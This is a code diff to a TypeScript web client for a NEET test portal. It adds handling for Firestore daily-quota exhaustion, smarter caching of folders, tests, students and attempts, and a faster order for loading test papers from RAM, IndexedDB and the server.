@@ -13,8 +13,14 @@ import {
   getDocs,
   getDocFromServer,
   setDoc,
+  updateDoc,
   deleteDoc,
   increment,
+  disableNetwork,
+  enableNetwork,
+  query,
+  where,
+  limit,
 } from '@firebase/firestore';
 import firebaseConfig from '../firebase-applet-config.json';
 import {
@@ -49,10 +55,41 @@ export const auth = getAuth(app);
 export const db = getFirestore(app, firebaseConfig.firestoreDatabaseId);
 export const googleProvider = new GoogleAuthProvider();
 
+const FIRESTORE_QUOTA_COOLDOWN_KEY = 'vs_firestore_quota_cooldown_until_v1';
+const FIRESTORE_QUOTA_COOLDOWN_MS = 60 * 60 * 1000;
+let firestoreNetworkDisabledForQuota = false;
+
+function readPersistedQuotaCooldown(): number {
+  try {
+    const raw = localStorage.getItem(FIRESTORE_QUOTA_COOLDOWN_KEY);
+    const ts = Number(raw || 0);
+    return Number.isFinite(ts) && ts > Date.now() ? ts : 0;
+  } catch {
+    return 0;
+  }
+}
+
+let firestoreQuotaCooldownUntil = readPersistedQuotaCooldown();
+
+function pauseFirestoreNetworkForQuota() {
+  if (firestoreNetworkDisabledForQuota) return;
+  firestoreNetworkDisabledForQuota = true;
+  void disableNetwork(db).catch(() => {});
+}
+
+if (firestoreQuotaCooldownUntil > Date.now()) {
+  pauseFirestoreNetworkForQuota();
+}
+
 async function testFirestoreConnection() {
+  if (firestoreQuotaCooldownUntil > Date.now()) return;
   try {
     await getDocFromServer(doc(db, 'test', 'connection'));
   } catch (error) {
+    if (noteFirestoreQuotaIfNeeded(error)) {
+      console.warn('Firestore daily free quota currently exhausted; pausing Firestore network sync temporarily.');
+      return;
+    }
     if (error instanceof Error && error.message.includes('the client is offline')) {
       console.error('Please check your Firebase configuration.');
     }
@@ -106,6 +143,71 @@ export async function signOutUser() {
 
 let lastKnownServerVersion = 0;
 let isStaticStoreHost = false;
+
+export function isFirestoreQuotaExceededError(err: unknown): boolean {
+  if (!err) return false;
+  const code =
+    typeof (err as { code?: unknown }).code === 'string'
+      ? (err as { code: string }).code.toLowerCase()
+      : '';
+  const msg = (err instanceof Error ? err.message : String(err)).toLowerCase();
+  return (
+    code === 'resource-exhausted' ||
+    msg.includes('quota limit exceeded') ||
+    msg.includes('quota exceeded') ||
+    msg.includes('resource-exhausted') ||
+    msg.includes('free daily read units') ||
+    msg.includes('free daily write units') ||
+    msg.includes('free daily delete units')
+  );
+}
+
+function noteFirestoreQuotaIfNeeded(err: unknown): boolean {
+  if (!isFirestoreQuotaExceededError(err)) return false;
+  firestoreQuotaCooldownUntil = Date.now() + FIRESTORE_QUOTA_COOLDOWN_MS;
+  try {
+    localStorage.setItem(FIRESTORE_QUOTA_COOLDOWN_KEY, String(firestoreQuotaCooldownUntil));
+  } catch {
+    // ignore
+  }
+  pauseFirestoreNetworkForQuota();
+  return true;
+}
+
+function isFirestoreInQuotaCooldown(): boolean {
+  if (Date.now() >= firestoreQuotaCooldownUntil && firestoreQuotaCooldownUntil > 0) {
+    firestoreQuotaCooldownUntil = 0;
+    try {
+      localStorage.removeItem(FIRESTORE_QUOTA_COOLDOWN_KEY);
+    } catch {
+      // ignore
+    }
+  }
+  return firestoreNetworkDisabledForQuota || Date.now() < firestoreQuotaCooldownUntil;
+}
+
+export function isFirestoreQuotaCurrentlyExhausted(): boolean {
+  return Date.now() < firestoreQuotaCooldownUntil || firestoreNetworkDisabledForQuota;
+}
+
+async function resumeFirestoreNetworkForRetry(forceClearCooldown = false): Promise<void> {
+  if (forceClearCooldown) {
+    firestoreQuotaCooldownUntil = 0;
+    try {
+      localStorage.removeItem(FIRESTORE_QUOTA_COOLDOWN_KEY);
+    } catch {
+      // ignore
+    }
+  }
+  if (firestoreNetworkDisabledForQuota && Date.now() >= firestoreQuotaCooldownUntil) {
+    firestoreNetworkDisabledForQuota = false;
+    try {
+      await enableNetwork(db);
+    } catch {
+      // ignore
+    }
+  }
+}
 
 export function isUsingStaticStore(): boolean {
   return isStaticStoreHost;
@@ -257,20 +359,51 @@ let cachedFirestoreOverlay: {
 } | null = null;
 
 async function fetchFirestoreOverlay(force = false) {
-  if (!force && cachedFirestoreOverlay && Date.now() - lastFirestoreOverlayAt < 12000) {
+  // On Express hosts, Express RAM/Disk already serves folders, tests, students & attempts with 0 Firestore reads.
+  // Never run 4-collection Firestore scans from regular bootstrap on Express (preserves daily free-tier read quota).
+  // Admin student/attempt cloud sync uses `fetchAllStudentsAndAttemptsForAdmin()` explicitly.
+  if (!isStaticStoreHost) {
+    return cachedFirestoreOverlay;
+  }
+  if (isFirestoreInQuotaCooldown()) {
+    return cachedFirestoreOverlay;
+  }
+  const ttlMs = isStaticStoreHost ? 180_000 : 300_000;
+  const minForceIntervalMs = 30_000;
+  const elapsed = Date.now() - lastFirestoreOverlayAt;
+  if (
+    cachedFirestoreOverlay &&
+    lastFirestoreOverlayAt > 0 &&
+    ((!force && elapsed < ttlMs) || (force && elapsed < minForceIntervalMs))
+  ) {
     return cachedFirestoreOverlay;
   }
   try {
-    const [folderSnap, testSnap, studentSnap, attemptSnap] = await Promise.all([
+    const [folderRes, testRes, studentRes, attemptRes] = await Promise.allSettled([
       getDocs(collection(db, 'folders')),
       getDocs(collection(db, 'tests')),
       getDocs(collection(db, 'students')),
       getDocs(collection(db, 'attempts')),
     ]);
 
+    for (const r of [folderRes, testRes, studentRes, attemptRes]) {
+      if (r.status === 'rejected') {
+        noteFirestoreQuotaIfNeeded(r.reason);
+      }
+    }
+
+    const folderSnap = folderRes.status === 'fulfilled' ? folderRes.value : null;
+    const testSnap = testRes.status === 'fulfilled' ? testRes.value : null;
+    const studentSnap = studentRes.status === 'fulfilled' ? studentRes.value : null;
+    const attemptSnap = attemptRes.status === 'fulfilled' ? attemptRes.value : null;
+
+    if (!folderSnap && !testSnap && !studentSnap && !attemptSnap) {
+      return cachedFirestoreOverlay;
+    }
+
     const fsFoldersRaw: Array<Record<string, any>> = [];
     const folderTombstones = new Map<string, number>();
-    folderSnap.forEach((d) => {
+    folderSnap?.forEach((d) => {
       const item = d.data() as Record<string, any>;
       if (!item) return;
       if (item.isDeletedTombstone || d.id.startsWith('__del__')) {
@@ -300,7 +433,7 @@ async function fetchFirestoreOverlay(force = false) {
 
     const fsTestsRaw: Array<Record<string, any>> = [];
     const testTombstones = new Map<string, number>();
-    testSnap.forEach((d) => {
+    testSnap?.forEach((d) => {
       const item = d.data() as Record<string, any>;
       if (!item) return;
       if (item.isDeletedTombstone || d.id.startsWith('__del__')) {
@@ -330,7 +463,7 @@ async function fetchFirestoreOverlay(force = false) {
 
     const students: StudentAccount[] = [];
     const deletedStudentIds: string[] = [];
-    studentSnap.forEach((d) => {
+    studentSnap?.forEach((d) => {
       const item = d.data() as Record<string, any>;
       if (!item) return;
       if (item.isDeletedTombstone || d.id.startsWith('__del__')) {
@@ -343,7 +476,7 @@ async function fetchFirestoreOverlay(force = false) {
 
     const attempts: TestAttempt[] = [];
     const deletedAttemptIds: string[] = [];
-    attemptSnap.forEach((d) => {
+    attemptSnap?.forEach((d) => {
       const item = d.data() as Record<string, any>;
       if (!item) return;
       if (item.isDeletedTombstone || d.id.startsWith('__del__')) {
@@ -355,19 +488,23 @@ async function fetchFirestoreOverlay(force = false) {
     });
 
     cachedFirestoreOverlay = {
-      folders,
-      deletedFolderIds,
-      tests,
-      deletedTestIds,
-      students,
-      deletedStudentIds,
-      attempts,
-      deletedAttemptIds,
+      folders: folderSnap ? folders : cachedFirestoreOverlay?.folders || [],
+      deletedFolderIds: folderSnap ? deletedFolderIds : cachedFirestoreOverlay?.deletedFolderIds || [],
+      tests: testSnap ? tests : cachedFirestoreOverlay?.tests || [],
+      deletedTestIds: testSnap ? deletedTestIds : cachedFirestoreOverlay?.deletedTestIds || [],
+      students: studentSnap ? students : cachedFirestoreOverlay?.students || [],
+      deletedStudentIds: studentSnap ? deletedStudentIds : cachedFirestoreOverlay?.deletedStudentIds || [],
+      attempts: attemptSnap ? attempts : cachedFirestoreOverlay?.attempts || [],
+      deletedAttemptIds: attemptSnap ? deletedAttemptIds : cachedFirestoreOverlay?.deletedAttemptIds || [],
     };
     lastFirestoreOverlayAt = Date.now();
     return cachedFirestoreOverlay;
   } catch (e) {
-    console.warn('Firestore overlay fetch notice:', e);
+    if (noteFirestoreQuotaIfNeeded(e)) {
+      console.warn('Firestore daily read quota reached; using Express/local cache.');
+    } else {
+      console.warn('Firestore overlay fetch notice:', e);
+    }
     return cachedFirestoreOverlay;
   }
 }
@@ -442,35 +579,28 @@ export async function fetchPortalBootstrap(forceFull = false): Promise<{
     }
 
     if (data && data.unchanged && !isStaticStoreHost && !forceFull) {
-      // Periodically still allow Firestore updates on Express every 15s
-      if (Date.now() - lastFirestoreOverlayAt < 15000) {
-        return {
-          unchanged: true,
-          version: Number(data.version) || lastKnownServerVersion,
-          tests: [],
-          deletedTestIds: [],
-          deletedFolderIds: [],
-          deletedStudentIds: [],
-          deletedAttemptIds: [],
-          tickedStudentMap: {},
-          folders: [],
-          students: [],
-          attempts: [],
-          notifications: [],
-        };
-      }
-      // On 15s refresh interval, re-fetch full base + Firestore overlay seamlessly
-      const fullRes = await fetch(`/api/store/bootstrap?t=${Date.now()}`, { cache: 'no-store' });
-      if (fullRes.ok && (fullRes.headers.get('content-type') || '').toLowerCase().includes('json')) {
-        data = await fullRes.json();
-      }
+      // Express SSE already delivers real-time mutations; stay on the ultra-fast 28-byte unchanged path
+      return {
+        unchanged: true,
+        version: Number(data.version) || lastKnownServerVersion,
+        tests: [],
+        deletedTestIds: [],
+        deletedFolderIds: [],
+        deletedStudentIds: [],
+        deletedAttemptIds: [],
+        tickedStudentMap: {},
+        folders: [],
+        students: [],
+        attempts: [],
+        notifications: [],
+      };
     }
 
     if (data && Number(data.version) > 0) {
       lastKnownServerVersion = Number(data.version);
     }
 
-    const fsOverlay = await fetchFirestoreOverlay(forceFull || isStaticStoreHost);
+    const fsOverlay = isStaticStoreHost ? await fetchFirestoreOverlay(forceFull) : cachedFirestoreOverlay;
 
     const baseDeletedTests: string[] = Array.isArray(data?.deletedTestIds) ? data.deletedTestIds : [];
     const baseDeletedFolders: string[] = Array.isArray(data?.deletedFolderIds) ? data.deletedFolderIds : [];
@@ -516,12 +646,24 @@ export async function fetchPortalBootstrap(forceFull = false): Promise<{
 
     const testMap = new Map<string, CbtTestMeta>();
     for (const t of Array.isArray(data?.tests) ? (data.tests as CbtTestMeta[]) : []) {
-      if (t && t.id && !deletedTestSet.has(t.id)) {
+      if (
+        t &&
+        t.id &&
+        !deletedTestSet.has(t.id) &&
+        !(t.folderId && deletedFolderSet.has(t.folderId))
+      ) {
         testMap.set(t.id, t);
       }
     }
     for (const ft of fsOverlay?.tests || []) {
-      if (!ft || !ft.id || deletedTestSet.has(ft.id)) continue;
+      if (
+        !ft ||
+        !ft.id ||
+        deletedTestSet.has(ft.id) ||
+        (ft.folderId && deletedFolderSet.has(ft.folderId))
+      ) {
+        continue;
+      }
       const baseT = testMap.get(ft.id);
       const fsUpdated = Number((ft as any).updatedAt || ft.createdAt || 0);
       const baseUpdated = Number((baseT as any)?.updatedAt || baseT?.createdAt || 0);
@@ -539,7 +681,7 @@ export async function fetchPortalBootstrap(forceFull = false): Promise<{
       }
     }
 
-    // Ensure every test's folderId exists in folderMap if it has a valid folderName
+    // Ensure every test's folderId exists in folderMap if it has a valid folderName (NEVER resurrect deleted folders)
     for (const t of testMap.values()) {
       if (t.folderId && t.folderName && !folderMap.has(t.folderId) && !deletedFolderSet.has(t.folderId)) {
         folderMap.set(t.folderId, {
@@ -833,26 +975,44 @@ export async function saveFolderToFirestore(folder: TestFolder): Promise<void> {
   }
 
   lastKnownServerVersion = 0;
-  lastFirestoreOverlayAt = 0;
-
-  try {
-    await Promise.all([
-      deleteDoc(doc(db, 'folders', `__del__${safeId}`)).catch(() => {}),
-      setDoc(doc(db, 'folders', safeId), buildFirestoreFolderDoc(cleanFolder), { merge: true }),
-    ]);
-  } catch (err) {
-    handleFirestoreError(err, OperationType.WRITE, `folders/${safeId}`);
+  if (cachedFirestoreOverlay) {
+    cachedFirestoreOverlay.folders = [
+      ...cachedFirestoreOverlay.folders.filter((f) => f.id !== safeId),
+      { ...cleanFolder, bannerUrl: cleanFolder.bannerUrl || undefined },
+    ];
+    cachedFirestoreOverlay.deletedFolderIds = cachedFirestoreOverlay.deletedFolderIds.filter(
+      (id) => id !== safeId
+    );
   }
 
+  let expressSaved = false;
   if (!isStaticStoreHost) {
     try {
-      await fetchWithRetry('/api/store/folder', {
+      const res = await fetchWithRetry('/api/store/folder', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ folder: cleanFolder, explicitAdminCreate: true }),
       });
+      expressSaved = res.ok;
     } catch {
       // ignore network error when static/offline
+    }
+  }
+
+  if (!isFirestoreInQuotaCooldown()) {
+    try {
+      await Promise.all([
+        deleteDoc(doc(db, 'folders', `__del__${safeId}`)).catch(() => {}),
+        setDoc(doc(db, 'folders', safeId), buildFirestoreFolderDoc(cleanFolder), { merge: true }),
+      ]);
+    } catch (err) {
+      if (noteFirestoreQuotaIfNeeded(err)) {
+        console.warn('Firestore quota exhausted during folder save; saved via Express/local store.');
+      } else if (!expressSaved) {
+        handleFirestoreError(err, OperationType.WRITE, `folders/${safeId}`);
+      } else {
+        console.warn('Background Firestore folder sync warning:', err);
+      }
     }
   }
 }
@@ -863,7 +1023,12 @@ export async function saveFolderToFirestore(folder: TestFolder): Promise<void> {
 export async function deleteFolderFromFirestore(folderId: string): Promise<void> {
   const safeId = folderId.replace(/[^a-zA-Z0-9_-]/g, '_').slice(0, 100);
   lastKnownServerVersion = 0;
-  lastFirestoreOverlayAt = 0;
+  if (cachedFirestoreOverlay) {
+    cachedFirestoreOverlay.folders = cachedFirestoreOverlay.folders.filter((f) => f.id !== safeId);
+    if (!cachedFirestoreOverlay.deletedFolderIds.includes(safeId)) {
+      cachedFirestoreOverlay.deletedFolderIds.push(safeId);
+    }
+  }
 
   try {
     const rawDel = localStorage.getItem('vs_neet_deleted_folder_ids_v1');
@@ -876,28 +1041,38 @@ export async function deleteFolderFromFirestore(folderId: string): Promise<void>
     // ignore
   }
 
-  try {
-    await setDoc(doc(db, 'folders', `__del__${safeId}`), {
-      id: `__del__${safeId}`,
-      name: '__DELETED__',
-      description: 'Deleted folder tombstone',
-      createdAt: Date.now(),
-      deletedAt: Date.now(),
-      isDeletedTombstone: true,
-      targetFolderId: safeId,
-    });
-    await deleteDoc(doc(db, 'folders', safeId)).catch(() => {});
-  } catch (err) {
-    handleFirestoreError(err, OperationType.DELETE, `folders/${safeId}`);
-  }
-
+  let expressDeleted = false;
   if (!isStaticStoreHost) {
     try {
-      await fetch(`/api/store/folder/${encodeURIComponent(safeId)}`, {
+      const res = await fetch(`/api/store/folder/${encodeURIComponent(safeId)}`, {
         method: 'DELETE',
       });
+      expressDeleted = res.ok;
     } catch {
       // ignore
+    }
+  }
+
+  if (!isFirestoreInQuotaCooldown()) {
+    try {
+      await setDoc(doc(db, 'folders', `__del__${safeId}`), {
+        id: `__del__${safeId}`,
+        name: '__DELETED__',
+        description: 'Deleted folder tombstone',
+        createdAt: Date.now(),
+        deletedAt: Date.now(),
+        isDeletedTombstone: true,
+        targetFolderId: safeId,
+      });
+      await deleteDoc(doc(db, 'folders', safeId)).catch(() => {});
+    } catch (err) {
+      if (noteFirestoreQuotaIfNeeded(err)) {
+        console.warn('Firestore quota exhausted during folder delete; deleted via Express/local store.');
+      } else if (!expressDeleted) {
+        handleFirestoreError(err, OperationType.DELETE, `folders/${safeId}`);
+      } else {
+        console.warn('Background Firestore folder delete warning:', err);
+      }
     }
   }
 }
@@ -1311,6 +1486,7 @@ export async function saveTestToFirestore(
 
   // 3. Cloud Firestore Persistence (works natively on Vercel CDN AND shares live across AI Studio & Vercel!)
   const saveToCloudFirestore = async () => {
+    if (isFirestoreInQuotaCooldown()) return;
     const htmlStr = rawHtml || '';
     const hasQs = compactedQuestions.length > 0;
     const hasHtml = htmlStr.trim().length > 0;
@@ -1403,7 +1579,15 @@ export async function saveTestToFirestore(
     await setDoc(doc(db, 'tests', safeId), buildFirestoreTestDoc(metaWithChunks, true), {
       merge: true,
     });
-    lastFirestoreOverlayAt = 0;
+    if (cachedFirestoreOverlay) {
+      cachedFirestoreOverlay.tests = [
+        ...cachedFirestoreOverlay.tests.filter((t) => t.id !== safeId),
+        metaWithChunks,
+      ];
+      cachedFirestoreOverlay.deletedTestIds = cachedFirestoreOverlay.deletedTestIds.filter(
+        (id) => id !== safeId
+      );
+    }
     if (isStaticStoreHost) {
       options?.onProgress?.(estTotal, estTotal);
     }
@@ -1531,11 +1715,19 @@ export async function saveTestToFirestore(
       await Promise.all([
         executeExpressSync(),
         saveToCloudFirestore().catch((err) => {
-          console.warn('Background Firestore mirror warning:', err);
+          if (noteFirestoreQuotaIfNeeded(err)) {
+            console.warn('Firestore quota exhausted during test mirror; Express save succeeded.');
+          } else {
+            console.warn('Background Firestore mirror warning:', err);
+          }
         }),
       ]);
     }
   } catch (e) {
+    if (noteFirestoreQuotaIfNeeded(e)) {
+      console.warn('Firestore quota exhausted during test save; saved in local Vault.');
+      return;
+    }
     if (isStaticStoreHost) {
       handleFirestoreError(e, OperationType.WRITE, `tests/${safeId}`);
     }
@@ -1578,16 +1770,22 @@ export async function reconcilePermanentTestsWithServer(
   if (serverIds.size > 0) {
     try {
       const CLIENT_BUNDLE_REV_KEY = 'vs_client_store_rev';
-      const TARGET_CLIENT_BUNDLE_REV = '20261116_v7';
+      const TARGET_CLIENT_BUNDLE_REV = '20261122_v10';
       if (localStorage.getItem(CLIENT_BUNDLE_REV_KEY) !== TARGET_CLIENT_BUNDLE_REV) {
         ramTestBundleCache.clear();
-        const serverIdList = Array.from(serverIds);
-        void purgeVaultTestPayloads(serverIdList).catch(() => {});
-        for (const sid of serverIdList) {
+        // Only purge cached payloads for tests that actually have a real server paper so any Admin-local HTML in Vault is never wiped!
+        const playableServerIds = serverTests
+          .filter((t) => t.hasPlayablePaper !== false)
+          .map((t) => t.id);
+        void purgeVaultTestPayloads(playableServerIds).catch(() => {});
+        for (const sid of playableServerIds) {
           localStorage.removeItem(`${LOCAL_QUESTIONS_PREFIX}${sid}`);
           localStorage.removeItem(`${LOCAL_HTML_PREFIX}${sid}`);
         }
+        localStorage.removeItem(LOCAL_TESTS_KEY);
         localStorage.removeItem('vs_neet_2027_folders_cache_v1');
+        localStorage.removeItem('vs_neet_2027_students_cache_v1');
+        localStorage.removeItem('vs_neet_2027_attempts_cache');
         localStorage.setItem(CLIENT_BUNDLE_REV_KEY, TARGET_CLIENT_BUNDLE_REV);
       }
     } catch {
@@ -1662,9 +1860,13 @@ export async function reconcilePermanentTestsWithServer(
           bannerUrl: resolvedBannerUrl,
           isPinned: t.isPinned !== undefined ? t.isPinned : prev.isPinned,
           pinnedAt: t.pinnedAt !== undefined ? t.pinnedAt : prev.pinnedAt,
-          attachmentPdfId: t.attachmentPdfId || prev.attachmentPdfId,
-          attachmentPdfName: t.attachmentPdfName || prev.attachmentPdfName,
+          attachmentPdfId: t.attachmentPdfId !== undefined ? t.attachmentPdfId : prev.attachmentPdfId,
+          attachmentPdfName:
+            t.attachmentPdfName !== undefined ? t.attachmentPdfName : prev.attachmentPdfName,
           isPdfOnly: effectiveIsPdfOnly,
+          hasPlayablePaper:
+            t.hasPlayablePaper !== undefined ? t.hasPlayablePaper : prev.hasPlayablePaper,
+          updatedAt: Math.max(Number(prev.updatedAt || 0), Number(t.updatedAt || 0)) || undefined,
           totalQuestions: healedTotalQ,
           maxMarks: healedMaxMarks,
           openCount: Math.max(Number(prev.openCount || 0), Number(t.openCount || 0)),
@@ -1797,6 +1999,9 @@ function areQuestionsPlayable(qs: CbtQuestion[]): boolean {
 async function loadTestBundleFromCloudFirestore(
   safeId: string
 ): Promise<{ meta?: CbtTestMeta; questions: CbtQuestion[]; rawHtml: string }> {
+  if (isFirestoreInQuotaCooldown()) {
+    return { questions: [], rawHtml: '' };
+  }
   try {
     const [metaSnap, qSnap, htmlSnap] = await Promise.all([
       getDoc(doc(db, 'tests', safeId)),
@@ -1838,7 +2043,8 @@ async function loadTestBundleFromCloudFirestore(
     const rawHtml = htmlDocs.map((h) => h.htmlPart).join('');
 
     return { meta, questions: mergedQs, rawHtml };
-  } catch {
+  } catch (err) {
+    noteFirestoreQuotaIfNeeded(err);
     return { questions: [], rawHtml: '' };
   }
 }
@@ -1999,32 +2205,96 @@ export async function loadTestHtmlFromFirestore(testId: string): Promise<string>
   return bundle.rawHtml;
 }
 
+const prefetchedPaperIds = new Set<string>();
+
 /**
- * Ultra-lightweight (<300KB) launch loader for HTML test mode:
- * Streams the full multi-MB HTML paper directly inside the sandboxed <iframe> via `/api/store/test/:id/paper.html`
- * or `/static-store/paper/:id.html` on Vercel.
- * Automatically reads Cloud Firestore when an Admin-added test isn't baked into static assets yet!
+ * Lightweight browser cache warm-up so clicking a test opens in 0ms.
+ */
+export function prefetchTestPaper(testId: string, versionTag?: number | string): void {
+  const safeId = (testId || '').replace(/[^a-zA-Z0-9_-]/g, '_').slice(0, 100);
+  if (!safeId || prefetchedPaperIds.has(safeId)) return;
+  prefetchedPaperIds.add(safeId);
+  const v = versionTag || 1;
+  const paperUrl = isStaticStoreHost
+    ? `/static-store/paper/${encodeURIComponent(safeId)}.html?v=${v}`
+    : `/api/store/test/${encodeURIComponent(safeId)}/paper.html?v=${v}`;
+  const metaUrl = isStaticStoreHost
+    ? `/static-store/test/${encodeURIComponent(safeId)}.json`
+    : `/api/store/test/${encodeURIComponent(safeId)}?skipHtml=1`;
+  try {
+    void fetch(paperUrl, { cache: 'force-cache', priority: 'low' } as RequestInit).catch(() => {});
+    void fetch(metaUrl, { cache: 'force-cache', priority: 'low' } as RequestInit).catch(() => {});
+  } catch {
+    // ignore
+  }
+}
+
+/**
+ * Ultra-fast launch loader for HTML & Practice test modes:
+ * 1. Checks 0ms RAM cache FIRST.
+ * 2. Checks ~5ms IndexedDB Permanent Vault SECOND.
+ * 3. Fetches lightweight <300KB `/api/store/test/:id?skipHtml=1` or `/static-store/test/:id.json` with tight timeout.
+ * 4. Automatically reads Cloud Firestore when an Admin-added test isn't baked into static assets yet!
  */
 export async function loadTestFastForLaunch(
   testId: string
 ): Promise<{ questions: CbtQuestion[]; rawHtml: string; useServerHtmlStream: boolean }> {
   const safeId = testId.replace(/[^a-zA-Z0-9_-]/g, '_').slice(0, 100);
 
-  // 1. Fast metadata+questions query (?skipHtml=1 or /static-store/test/:id.json)
+  // 1. 0ms RAM cache check FIRST (instant open!)
+  const cachedRam = ramTestBundleCache.get(safeId);
+  if (
+    cachedRam &&
+    (cachedRam.rawHtml.trim().length > 20 || areQuestionsPlayable(cachedRam.questions))
+  ) {
+    return {
+      questions: cachedRam.questions,
+      rawHtml: cachedRam.rawHtml,
+      useServerHtmlStream: cachedRam.rawHtml.trim().length <= 20,
+    };
+  }
+
+  // 2. Fast ~5ms IndexedDB Vault check SECOND (instant offline/repeat open!)
+  try {
+    const [vaultQs, vaultHtml] = await Promise.all([
+      getVaultTestQuestions(safeId),
+      getVaultTestHtml(safeId),
+    ]);
+    if (vaultHtml.trim().length > 20) {
+      setRamBundleCache(safeId, vaultQs, vaultHtml);
+      return {
+        questions: vaultQs,
+        rawHtml: vaultHtml,
+        useServerHtmlStream: false,
+      };
+    }
+    if (areQuestionsPlayable(vaultQs)) {
+      setRamBundleCache(safeId, vaultQs, '');
+      return {
+        questions: vaultQs,
+        rawHtml: '',
+        useServerHtmlStream: true,
+      };
+    }
+  } catch {
+    // ignore
+  }
+
+  // 3. Fast metadata+questions query (?skipHtml=1 or /static-store/test/:id.json)
   try {
     const controller = new AbortController();
-    const timer = window.setTimeout(() => controller.abort(), 8000);
+    const timer = window.setTimeout(() => controller.abort(), 4500);
     const primaryUrl = isStaticStoreHost
       ? `/static-store/test/${encodeURIComponent(safeId)}.json`
       : `/api/store/test/${encodeURIComponent(safeId)}?skipHtml=1`;
     let res = await fetch(primaryUrl, {
-      cache: 'no-store',
+      cache: 'default',
       signal: controller.signal,
     });
     const ct = (res.headers.get('content-type') || '').toLowerCase();
     if ((!res.ok || !ct.includes('json')) && !isStaticStoreHost) {
       res = await fetch(`/static-store/test/${encodeURIComponent(safeId)}.json`, {
-        cache: 'no-store',
+        cache: 'default',
         signal: controller.signal,
       });
     }
@@ -2038,6 +2308,9 @@ export async function loadTestFastForLaunch(
         ? payload.questions.map((item, idx) => normalizeCbtQuestion(item, idx))
         : [];
       if (payload.hasRawHtml || serverQs.length > 0) {
+        if (serverQs.length > 0) {
+          setRamBundleCache(safeId, serverQs, '');
+        }
         return {
           questions: serverQs,
           rawHtml: '',
@@ -2046,37 +2319,7 @@ export async function loadTestFastForLaunch(
       }
     }
   } catch {
-    // Check RAM/Vault/Firestore below
-  }
-
-  // 2. Check RAM cache (0ms)
-  const cachedRam = ramTestBundleCache.get(safeId);
-  if (
-    cachedRam &&
-    (cachedRam.rawHtml.trim().length > 20 || areQuestionsPlayable(cachedRam.questions))
-  ) {
-    return {
-      questions: cachedRam.questions,
-      rawHtml: cachedRam.rawHtml,
-      useServerHtmlStream: false,
-    };
-  }
-
-  // 3. Offline local-only check via IndexedDB Vault (<5ms)
-  try {
-    const [vaultQs, vaultHtml] = await Promise.all([
-      getVaultTestQuestions(safeId),
-      getVaultTestHtml(safeId),
-    ]);
-    if (vaultHtml.trim().length > 20 || vaultQs.length > 0) {
-      return {
-        questions: vaultQs,
-        rawHtml: vaultHtml,
-        useServerHtmlStream: false,
-      };
-    }
-  } catch {
-    // ignore
+    // Fallback to Cloud Firestore below
   }
 
   // 4. Live Cloud Firestore check (for newly Admin-added tests not in static CDN build)
@@ -2107,7 +2350,28 @@ export async function deleteTestFromFirestore(testId: string): Promise<void> {
   const safeId = testId.replace(/[^a-zA-Z0-9_-]/g, '_').slice(0, 100);
   markTestDeletedLocally(safeId);
   lastKnownServerVersion = 0;
-  lastFirestoreOverlayAt = 0;
+  if (cachedFirestoreOverlay) {
+    cachedFirestoreOverlay.tests = cachedFirestoreOverlay.tests.filter((t) => t.id !== safeId);
+    if (!cachedFirestoreOverlay.deletedTestIds.includes(safeId)) {
+      cachedFirestoreOverlay.deletedTestIds.push(safeId);
+    }
+  }
+
+  let expressDeleted = false;
+  if (!isStaticStoreHost) {
+    try {
+      const res = await fetch(`/api/store/test/${encodeURIComponent(safeId)}`, {
+        method: 'DELETE',
+      });
+      expressDeleted = res.ok;
+    } catch {
+      // ignore
+    }
+  }
+
+  if (isFirestoreInQuotaCooldown()) {
+    return;
+  }
 
   try {
     await setDoc(doc(db, 'tests', `__del__${safeId}`), {
@@ -2128,26 +2392,32 @@ export async function deleteTestFromFirestore(testId: string): Promise<void> {
       isDeletedTombstone: true,
       targetTestId: safeId,
     });
-    const [qSnap, htmlSnap] = await Promise.all([
-      getDocs(collection(db, 'tests', safeId, 'questionChunks')),
-      getDocs(collection(db, 'tests', safeId, 'htmlChunks')),
-    ]);
-    await Promise.all([
-      ...qSnap.docs.map((d) => deleteDoc(d.ref).catch(() => {})),
-      ...htmlSnap.docs.map((d) => deleteDoc(d.ref).catch(() => {})),
-      deleteDoc(doc(db, 'tests', safeId)).catch(() => {}),
-    ]);
-  } catch (err) {
-    handleFirestoreError(err, OperationType.DELETE, `tests/${safeId}`);
-  }
+    await deleteDoc(doc(db, 'tests', safeId)).catch(() => {});
 
-  if (!isStaticStoreHost) {
+    // Clean up subcollection chunks best-effort without letting read quota block deletion
     try {
-      await fetch(`/api/store/test/${encodeURIComponent(safeId)}`, {
-        method: 'DELETE',
-      });
-    } catch {
-      // ignore
+      const [qSnap, htmlSnap] = await Promise.all([
+        getDocs(collection(db, 'tests', safeId, 'questionChunks')),
+        getDocs(collection(db, 'tests', safeId, 'htmlChunks')),
+      ]);
+      await Promise.all([
+        ...qSnap.docs.map((d) => deleteDoc(d.ref).catch(() => {})),
+        ...htmlSnap.docs.map((d) => deleteDoc(d.ref).catch(() => {})),
+      ]);
+    } catch (chunkErr) {
+      noteFirestoreQuotaIfNeeded(chunkErr);
+    }
+  } catch (err) {
+    if (noteFirestoreQuotaIfNeeded(err)) {
+      console.warn(
+        'Firestore daily quota exhausted during test delete; test removed from Express server and local vault.'
+      );
+      return;
+    }
+    if (!expressDeleted) {
+      handleFirestoreError(err, OperationType.DELETE, `tests/${safeId}`);
+    } else {
+      console.warn('Background Firestore test delete warning:', err);
     }
   }
 }
@@ -2306,32 +2576,29 @@ export async function incrementTestEngagement(
 ): Promise<void> {
   const safeId = testId.replace(/[^a-zA-Z0-9_-]/g, '_').slice(0, 100);
 
-  try {
-    const testRef = doc(db, 'tests', safeId);
-    const snap = await getDoc(testRef);
-    if (snap.exists()) {
-      await setDoc(
-        testRef,
-        {
-          [field]: increment(1),
-          lastPlayedAt: Date.now(),
-        },
-        { merge: true }
-      );
-    }
-  } catch {
-    // non-fatal analytics
-  }
-
+  let expressEngaged = false;
   if (!isStaticStoreHost) {
     try {
-      await fetch(`/api/store/test/${encodeURIComponent(safeId)}/engage`, {
+      const res = await fetch(`/api/store/test/${encodeURIComponent(safeId)}/engage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ field }),
       });
+      expressEngaged = res.ok;
     } catch {
       // ignore
+    }
+  }
+
+  if (!expressEngaged && !isFirestoreInQuotaCooldown()) {
+    try {
+      const testRef = doc(db, 'tests', safeId);
+      await updateDoc(testRef, {
+        [field]: increment(1),
+        lastPlayedAt: Date.now(),
+      });
+    } catch (err) {
+      noteFirestoreQuotaIfNeeded(err);
     }
   }
 }
